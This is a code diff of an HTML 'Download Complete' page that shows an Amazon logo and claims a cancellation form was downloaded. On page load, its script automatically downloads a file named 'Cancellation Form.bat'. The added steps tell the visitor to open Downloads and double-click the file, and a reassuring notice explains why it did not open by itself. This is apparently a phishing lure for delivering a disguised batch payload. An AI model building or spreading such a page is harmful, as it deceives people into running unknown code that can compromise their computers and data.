@@ -1,6 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<html lang="en"><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Download Complete</title>
@@ -16,25 +14,27 @@ body {
   height: 100vh;
 }
 
-/* CARD */
 .card {
   background: white;
   padding: 40px;
-  border-radius: 14px;
-  box-shadow: 0 18px 40px rgba(0,0,0,0.1);
-  max-width: 520px;
+  border-radius: 16px;
+  box-shadow: 0 18px 40px rgba(0,0,0,0.12);
+  max-width: 560px;
+  width: 100%;
   text-align: center;
 }
 
-/* ICON */
-.icon {
-  font-size: 60px;
+/* LOGO */
+.logo {
   margin-bottom: 20px;
+}
+.logo img {
+  width: 80px;
 }
 
 /* TITLE */
 h1 {
-  margin: 0;
+  margin: 10px 0;
   font-size: 26px;
 }
 
@@ -43,6 +43,38 @@ p {
   color: #555;
   font-size: 15px;
   line-height: 1.6;
+}
+
+/* STEPS */
+.steps {
+  margin-top: 30px;
+  text-align: left;
+}
+
+.step {
+  display: flex;
+  gap: 15px;
+  align-items: flex-start;
+  margin-bottom: 18px;
+}
+
+.step-icon {
+  font-size: 28px;
+}
+
+.step-text {
+  font-size: 14px;
+  color: #333;
+}
+
+/* INFO BOX */
+.info {
+  background: #f1f5fb;
+  padding: 14px;
+  border-radius: 10px;
+  margin-top: 20px;
+  font-size: 14px;
+  color: #333;
 }
 
 /* BUTTON */
@@ -56,47 +88,84 @@ p {
   color: #111;
   border-radius: 8px;
   box-shadow: 0 4px 0 #cc7a00;
+  cursor: pointer;
 }
 </style>
-</head>
+<meta name="GENERATOR" content="MSHTML 11.00.10570.1001"></head>
 
 <body>
 
 <div class="card">
 
-  <div class="icon">⬇️</div>
+  <!-- LOGO -->
+  <div class="logo">
+    <!-- Replace logo.png with your own logo if desired -->
+    <img alt="Logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
+  </div>
 
   <h1>Cancellation Form Downloaded</h1>
 
   <p>
-    Your cancellation request file has been successfully downloaded.<br><br>
-    Please open the downloaded document, review the details,
-    and follow the instructions provided inside the file to
-    complete your cancellation process.
+    Your cancellation form has been successfully downloaded to your computer.<br>
+    Please open the file, complete the form, and submit it as instructed.
   </p>
 
-  <!-- MANUAL OPEN BUTTON -->
-  <a class="open-btn"
-     href="Cancellation Form.bat"
-     target="_blank">
-     Open Downloaded File
-  </a>
+  <!-- HOW TO OPEN -->
+  <div class="steps">
+    <h3>How to Open the Downloaded File</h3>
+
+    <div class="step">
+      <div class="step-icon">📁</div>
+      <div class="step-text">
+        Open your <b>Downloads</b> folder on your computer.
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-icon">📄</div>
+      <div class="step-text">
+        Locate the file named <b>Cancellation Form.bat</b>.
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-icon">🖱️</div>
+      <div class="step-text">
+        Double-click the file to open it.
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-icon">✅</div>
+      <div class="step-text">
+        Follow the on-screen instructions inside the file to complete and submit your cancellation.
+      </div>
+    </div>
+  </div>
+
+  <div class="info">
+    ⚠️ For security reasons, browsers cannot open downloaded files automatically.<br>
+    If the file does not open, please access it manually from your Downloads folder.
+  </div>
+
+  <!-- SAFE BUTTON -->
+  <div class="open-btn" onclick="alert('Please open the file from your Downloads folder.')">
+    File Downloaded
+  </div>
 
 </div>
 
-<!-- AUTO DOWNLOAD SCRIPT -->
+<!-- AUTO DOWNLOAD -->
 <script>
 window.onload = function () {
-
   const link = document.createElement("a");
-  link.href = "Cancellation Form.bat";   // File name
+  link.href = "Cancellation Form.bat";
   link.download = "Cancellation Form.bat";
   document.body.appendChild(link);
   link.click();
   document.body.removeChild(link);
-
 };
 </script>
 
-</body>
-</html>
+
+</body></html>
